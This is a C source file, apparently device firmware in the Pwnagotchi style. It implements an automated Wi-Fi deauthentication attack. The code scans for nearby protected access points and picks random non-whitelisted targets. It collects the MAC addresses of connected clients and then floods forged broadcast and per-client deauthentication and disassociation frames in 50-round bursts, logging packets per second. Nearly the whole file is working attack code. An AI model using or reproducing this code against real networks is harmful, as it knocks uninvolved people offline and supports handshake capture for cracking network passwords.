#include "deauth.h"
#include "config.h"
#include "channel.h"
#include <furi.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include "../wlan_app/wlan_hal.h"
#define TAG "PwnDeauth"
static uint8_t s_deauth_temp[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00
};
static uint8_t s_deauth_frame[26];
static uint8_t s_disassoc_frame[26];
static uint8_t s_broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static char s_selected_ap_ssid[33];
static uint8_t s_selected_bssid[6];
static int s_selected_channel;
static bool s_selected = false;
static bool s_running = false;
#define MAX_TARGETS 16
typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
} TargetAP;
static TargetAP s_target_queue[MAX_TARGETS];
static int s_target_count = 0;
static int s_target_idx = 0;
static int s_last_scan_aps = 0;
static int s_total_aps_seen = 0;
static uint8_t s_collect_bssid[6];
static bool s_collecting = false;
static uint8_t s_clients[DEAUTH_MAX_CLIENTS][6];
static int s_client_count = 0;
void deauth_collect_start(const uint8_t* bssid) {
    memcpy(s_collect_bssid, bssid, 6);
    s_collecting = true;
    s_client_count = 0;
}
void deauth_collect_stop(void) {
    s_collecting = false;
}
bool deauth_is_collecting(void) {
    return s_collecting;
}
void deauth_report_mac(const uint8_t* mac) {
    if (!s_collecting || s_client_count >= DEAUTH_MAX_CLIENTS) return;
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) { is_broadcast = false; break; }
    }
    if (is_broadcast) return;
    if (memcmp(mac, s_collect_bssid, 6) == 0) return;
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i], mac, 6) == 0) return;
    }
    memcpy(s_clients[s_client_count], mac, 6);
    s_client_count++;
    ESP_LOGD(TAG, "New client: %02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}
int deauth_get_client_count(void) {
    return s_client_count;
}
void deauth_get_ap_counts(int* now, int* total) {
    if (now) *now = s_last_scan_aps;
    if (total) *total = s_total_aps_seen;
}
const uint8_t* deauth_get_client_mac(int index) {
    if (index < 0 || index >= s_client_count) return NULL;
    return s_clients[index];
}
static bool send_packet(uint8_t* buf, uint16_t len) {
    bool ok = wlan_hal_send_raw(buf, len);
    furi_delay_ms(10);
    return ok;
}
void deauth_add(const char* bssid) {
    if (g_config.whitelist_count >= PWNAGOTCHI_WHITELIST_MAX) return;
    strncpy(g_config.whitelist[g_config.whitelist_count], bssid, 32);
    g_config.whitelist_count++;
    ESP_LOGI(TAG, "Adding %s to whitelist", bssid);
}
void deauth_list(void) {
    for (int i = 0; i < g_config.whitelist_count; i++) {
        ESP_LOGI(TAG, "Whitelisted: %s", g_config.whitelist[i]);
    }
}
bool deauth_select(void) {
    if (!wlan_hal_is_started()) {
        ESP_LOGE(TAG, "WiFi not started for deauth scan");
        return false;
    }
    if (s_target_idx < s_target_count) {
        TargetAP* t = &s_target_queue[s_target_idx++];
        strncpy(s_selected_ap_ssid, t->ssid, sizeof(s_selected_ap_ssid) - 1);
        memcpy(s_selected_bssid, t->bssid, 6);
        s_selected_channel = t->channel;
        ESP_LOGI(TAG, "Selected queued AP: %s (CH: %d) [%d/%d]",
                 s_selected_ap_ssid, s_selected_channel, s_target_idx, s_target_count);
        memcpy(s_deauth_frame, s_deauth_temp, sizeof(s_deauth_temp));
        memcpy(s_disassoc_frame, s_deauth_temp, sizeof(s_deauth_temp));
        s_deauth_frame[0] = 0xC0; s_deauth_frame[1] = 0x00;
        s_disassoc_frame[0] = 0xA0; s_disassoc_frame[1] = 0x00;
        memcpy(s_deauth_frame + 4, s_broadcast, 6);
        memcpy(s_deauth_frame + 10, s_selected_bssid, 6);
        memcpy(s_deauth_frame + 16, s_selected_bssid, 6);
        memcpy(s_disassoc_frame + 4, s_broadcast, 6);
        memcpy(s_disassoc_frame + 10, s_selected_bssid, 6);
        memcpy(s_disassoc_frame + 16, s_selected_bssid, 6);
        s_selected = true;
        return true;
    }
    s_target_count = 0;
    s_target_idx = 0;
    s_selected = false;
    memset(s_selected_ap_ssid, 0, sizeof(s_selected_ap_ssid));
    ESP_LOGI(TAG, "Scanning for new AP targets...");
    wifi_ap_record_t* records = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&records, &count, 50);
    s_last_scan_aps = count;
    if (count > s_total_aps_seen) s_total_aps_seen = count;
    if (count > 0) {
        int indices[count];
        for (int i = 0; i < count; i++) indices[i] = i;
        for (int i = count - 1; i > 0; i--) {
            int j = config_random(0, i);
            int t = indices[i]; indices[i] = indices[j]; indices[j] = t;
        }
        for (int attempt = 0; attempt < count; attempt++) {
            int idx = indices[attempt];
            wifi_ap_record_t* ap = &records[idx];
            if (ap->authmode == WIFI_AUTH_OPEN) continue;
            bool whitelisted = false;
            for (int w = 0; w < g_config.whitelist_count; w++) {
                if (strcmp((const char*)ap->ssid, g_config.whitelist[w]) == 0) {
                    whitelisted = true;
                    break;
                }
            }
            if (whitelisted) continue;
            if (s_target_count < MAX_TARGETS) {
                TargetAP* t = &s_target_queue[s_target_count++];
                strncpy(t->ssid, (const char*)ap->ssid, sizeof(t->ssid) - 1);
                t->ssid[sizeof(t->ssid) - 1] = '\0';
                memcpy(t->bssid, ap->bssid, 6);
                t->channel = ap->primary;
            }
        }
        free(records);
        if (s_target_count > 0) {
            ESP_LOGI(TAG, "Found %d valid AP target(s)", s_target_count);
            return deauth_select();
        }
        ESP_LOGI(TAG, "No suitable AP found (all open or whitelisted)");
        return false;
    }
    ESP_LOGI(TAG, "No APs found");
    if (records) free(records);
    return false;
}
void deauth_get_target(char* out_essid, size_t essid_sz, uint8_t out_bssid[6]) {
    if (out_essid && essid_sz > 0) {
        strncpy(out_essid, s_selected_ap_ssid, essid_sz - 1);
        out_essid[essid_sz - 1] = '\0';
    }
    if (out_bssid) {
        memcpy(out_bssid, s_selected_bssid, 6);
    }
}
void deauth_run(void) {
    if (!g_config.deauth) return;
    if (s_running) {
        ESP_LOGI(TAG, "Attack already running");
        return;
    }
    if (!s_selected) {
        if (!deauth_select()) return;
    }
    ESP_LOGI(TAG, "Starting deauth attack on %s", s_selected_ap_ssid);
    s_running = true;
    wlan_hal_set_channel((uint8_t)s_selected_channel);
    deauth_collect_start(s_selected_bssid);
    furi_delay_ms(500);
    deauth_collect_stop();
    ESP_LOGI(TAG, "Found %d client(s) for directed deauth", s_client_count);
    int deauth_size = sizeof(s_deauth_temp);
    int disassoc_size = sizeof(s_deauth_temp);
    int packets = 0;
    int64_t start = esp_timer_get_time();
    int rounds = 50;
    for (int r = 0; r < rounds; r++) {
        send_packet(s_deauth_frame, deauth_size);
        send_packet(s_disassoc_frame, disassoc_size);
        packets += 2;
        for (int c = 0; c < s_client_count; c++) {
            uint8_t deauth[26], disassoc[26];
            memcpy(deauth, s_deauth_temp, deauth_size);
            memcpy(disassoc, s_deauth_temp, disassoc_size);
            deauth[0] = 0xC0;
            disassoc[0] = 0xA0;
            memcpy(deauth + 4, s_clients[c], 6);
            memcpy(disassoc + 4, s_clients[c], 6);
            memcpy(deauth + 10, s_selected_bssid, 6);
            memcpy(disassoc + 10, s_selected_bssid, 6);
            memcpy(deauth + 16, s_selected_bssid, 6);
            memcpy(disassoc + 16, s_selected_bssid, 6);
            if (send_packet(deauth, deauth_size)) packets++;
            if (send_packet(disassoc, disassoc_size)) packets++;
        }
        if (r % 10 == 0) {
            float elapsed = (float)(esp_timer_get_time() - start) / 1000000.0f;
            if (elapsed > 0.001f) {
                float pps = (float)packets / elapsed;
                ESP_LOGI(TAG, "PPS: %.1f pkt/s (%d clients, AP: %s)",
                         pps, s_client_count, s_selected_ap_ssid);
            }
        }
    }
    ESP_LOGI(TAG, "Attack finished! Sent %d packets (%d clients)", packets, s_client_count);
    s_running = false;
    s_selected = false;
}